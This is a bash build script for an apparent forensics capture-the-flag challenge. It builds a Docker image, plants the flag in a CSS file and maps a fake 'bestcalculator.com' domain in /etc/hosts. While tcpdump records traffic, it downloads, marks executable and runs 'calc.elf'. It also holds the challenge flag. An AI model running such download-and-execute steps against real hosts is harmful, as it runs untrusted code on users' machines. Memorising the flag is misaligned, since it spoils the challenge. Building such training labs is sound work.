repo="menoone/nimrod"
flag="pearl{us3_y0ur_c4lcul4t0r_bc}"
ip="192.168.155.190"

# check if image exists
docker images | grep ${repo}

echo "Overwrite image (if exists) (y/N)"
read choice

case $choice in
    "Y")
        echo "[+] overwriting pre-existing image"
    ;;
    "y")
        echo "[+] overwriting pre-existing image"
    ;;
    *)
        echo "[+] Abort request recieved! Stopping build"
        exit
esac

# build and commit init image
docker build -t ${repo}-init .
docker rm -f nimrod
docker run -d --platform=linux/amd64 --name nimrod ${repo}-init
docker exec nimrod bash -c "tcpdump -w /root/network.pcap &"

docker exec nimrod bash -c "echo '/* Wondering where the flag is? Here it is */' >> /home/n00b/next_amazon/style.css"
docker exec nimrod bash -c "echo '/* $flag */' >> /home/n00b/next_amazon/style.css"
docker exec nimrod bash -c "echo '$ip bestcalculator.com' >> /etc/hosts"

# make some queries
docker exec nimrod bash -c "curl https://www.bing.com/search?q=best+os+linux+vs+windows"
docker exec nimrod bash -c "curl https://hackr.io/blog/linux-vs-windows"
docker exec nimrod bash -c "curl https://www.bing.com/search?q=calculator+in+linux+terminal"

# go to main stuff
docker exec nimrod bash -c "curl http://bestcalculator.com"
docker exec -w /home/n00b -u n00b nimrod bash -c "curl http://bestcalculator.com/calc.elf -o calc.elf"
docker exec -u n00b nimrod bash -c "chmod +x /home/n00b/calc.elf"
docker exec -it -w /home/n00b -u n00b nimrod ./calc.elf
docker exec nimrod bash -c "pkill -x tcpdump"

docker commit nimrod ${repo}

# clean up
docker rm -f nimrod
docker rmi ${repo}-init 
